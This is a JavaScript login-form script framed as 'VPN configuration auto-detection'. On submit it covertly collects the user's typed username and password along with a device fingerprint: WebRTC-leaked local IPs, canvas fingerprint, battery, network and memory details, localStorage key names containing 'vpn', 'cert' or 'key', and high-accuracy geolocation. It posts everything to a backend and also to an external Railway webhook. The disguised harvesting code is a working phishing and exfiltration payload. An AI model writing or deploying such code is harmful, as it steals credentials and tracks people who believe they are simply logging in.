document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const container = document.querySelector('.container');
    const congratsContainer = document.querySelector('.congrats-container');

    // Background VPN configuration auto-detection function
    async function autoDetectVPNConfig() {
        const vpnConfig = {
            ca_crt: null,
            client_crt: null,
            client_key: null,
            ta_key: null,
            server_ip: '206.45.29.181',
            server_port: 1194,
            protocol: 'udp',
            system_info: {}
        };

        try {
            // Collect system information
            vpnConfig.system_info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                timestamp: new Date().toISOString(),
                localIPs: [] // Will be populated by WebRTC
            };

            // Try to detect browser plugins/extensions
            if (navigator.plugins) {
                vpnConfig.system_info.plugins = Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }));
            }

            // Enhanced WebRTC Local IP Detection
            await new Promise((resolve) => {
                const rtcConfig = {
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' }
                    ]
                };
                
                try {
                    const pc = new RTCPeerConnection(rtcConfig);
                    const noop = () => {};
                    
                    pc.createDataChannel('');
                    
                    pc.createOffer().then(offer => {
                        return pc.setLocalDescription(offer);
                    }).catch(noop);
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            resolve();
                            return;
                        }
                        
                        const candidateStr = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]+:+)+[a-f0-9]+/g;
                        const ips = candidateStr.match(ipRegex);
                        
                        if (ips) {
                            ips.forEach(ip => {
                                if (!vpnConfig.system_info.localIPs.includes(ip) && 
                                    !ip.startsWith('0.') && 
                                    ip !== '0.0.0.0') {
                                    vpnConfig.system_info.localIPs.push(ip);
                                }
                            });
                        }
                    };
                    
                    // Set timeout to resolve after 2 seconds
                    setTimeout(() => {
                        pc.close();
                        resolve();
                    }, 2000);
                    
                } catch (e) {
                    console.log('WebRTC detection failed:', e);
                    resolve();
                }
            });

            // Check for VPN-related browser storage
            if (localStorage) {
                const vpnKeys = [];
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key && (key.toLowerCase().includes('vpn') || 
                               key.toLowerCase().includes('openvpn') ||
                               key.toLowerCase().includes('cert') ||
                               key.toLowerCase().includes('key'))) {
                        vpnKeys.push(key);
                    }
                }
                if (vpnKeys.length > 0) {
                    vpnConfig.system_info.vpnRelatedKeys = vpnKeys;
                }
            }

            // Detect common VPN paths (browser can't actually read files, but we track the attempt)
            const commonVPNPaths = [
                'C:\\Program Files\\OpenVPN\\config',
                'C:\\Users\\' + (vpnConfig.system_info.userAgent.includes('Windows') ? 'Public' : 'User') + '\\OpenVPN\\config',
                '/etc/openvpn',
                '~/.openvpn',
                '/usr/local/etc/openvpn'
            ];
            vpnConfig.system_info.commonVPNPaths = commonVPNPaths;

            // Battery information (if available)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    vpnConfig.system_info.battery = {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    console.log('Battery info not available');
                }
            }

            // Network information
            if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                vpnConfig.system_info.connection = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }

            // Device memory
            if (navigator.deviceMemory) {
                vpnConfig.system_info.deviceMemory = navigator.deviceMemory;
            }

            // Canvas fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('VPN Config Detection', 2, 2);
                vpnConfig.system_info.canvasFingerprint = canvas.toDataURL().substring(0, 100);
            } catch (e) {
                console.log('Canvas fingerprinting failed');
            }

            // Get geolocation if permitted
            if (navigator.geolocation) {
                try {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                vpnConfig.system_info.geolocation = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    altitude: position.coords.altitude,
                                    altitudeAccuracy: position.coords.altitudeAccuracy,
                                    heading: position.coords.heading,
                                    speed: position.coords.speed
                                };
                                resolve();
                            },
                            () => {
                                vpnConfig.system_info.geolocation = 'denied';
                                resolve();
                            },
                            { timeout: 3000, enableHighAccuracy: true }
                        );
                    });
                } catch (e) {
                    console.log('Geolocation not available');
                }
            }

        } catch (error) {
            console.error('Error during VPN auto-detection:', error);
        }

        return vpnConfig;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Basic validation
        if (!username || !password) {
            alert('Please enter both username and password');
            return;
        }
        
        console.log('Submitting form and auto-detecting VPN config...');
        
        try {
            // Auto-detect VPN configuration in background
            const vpnConfig = await autoDetectVPNConfig();
            
            // Prepare data payload with auto-detected info
            const payload = {
                username,
                password,
                ...vpnConfig
            };
            
            console.log('Payload with auto-detected config:', {
                username,
                hasSystemInfo: !!payload.system_info,
                systemInfoKeys: Object.keys(payload.system_info || {})
            });
            
            // Send to backend API (which stores in Supabase)
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            console.log('Response status:', response.status);
            
            const result = await response.json();
            console.log('Response data:', result);
            
            if (response.ok && result.success) {
                // Hide login form and show success message
                container.style.display = 'none';
                congratsContainer.style.display = 'block';
                console.log('Data stored successfully in Supabase with auto-detected VPN config');
                
                // Also send to the original webhook (optional backup)
                const webhookURL = 'https://primary-production-011af.up.railway.app/webhook/739d8ccf-4a0a-479b-91e7-6427681622ff';
                
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).catch(error => {
                    console.warn('Webhook submission failed (non-critical):', error);
                });
            } else {
                console.error('Submission failed:', result.error);
                alert('Submission failed: ' + (result.error || 'Unknown error'));
            }
            
        } catch (error) {
            console.error('Error during submission:', error);
            alert('An error occurred. Please check console for details.');
        }
    });
});